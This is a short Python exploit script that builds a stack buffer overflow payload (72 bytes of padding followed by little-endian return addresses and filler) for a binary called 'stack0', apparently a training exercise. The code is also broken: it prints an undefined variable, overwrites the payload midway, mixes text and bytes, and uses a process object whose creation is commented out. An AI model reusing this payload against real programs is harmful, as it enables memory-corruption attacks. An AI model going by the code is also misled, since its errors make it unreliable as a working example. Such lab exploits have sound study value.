import struct
import subprocess
#print '\npopen3:'
payload = 'A' * 72

#payload += struct.pack("<I", 0x76EE012C)
i1=0xb6f29bc4
payload += i1.to_bytes(4, byteorder='little', signed=True)
print(four_bytes)

i2=0x7efff7f3
payload = i2.to_bytes(4, byteorder='little', signed=True)
print(four_bytes)

payload += 'BBBB'
i3=0x76EC2BC8
payload += i3.to_bytes(4, byteorder='little', signed=True)
print(four_bytes)

payload += 'CCCC'
payload += 'DDDD'
payload += 'EEEE'
payload += 'FFFF'
payload += struct.pack("<I", 0x76e9ffac)
#print("[*] Sending Payload (!)")
#proc = subprocess.Popen('./stack0',
#                        shell=True,
#                        stdin=subprocess.PIPE,
#                        stdout=subprocess.PIPE,
#                        stderr=subprocess.PIPE,
#                        )
#print proc.stdout
#stdout_value, stderr_value = proc.communicate('through stdin to stdout')
stdout_value, stderr_value = proc.communicate(payload)
#print '\tpass through:', repr(stdout_value)
#print '\tstderr      :', repr(stderr_value)
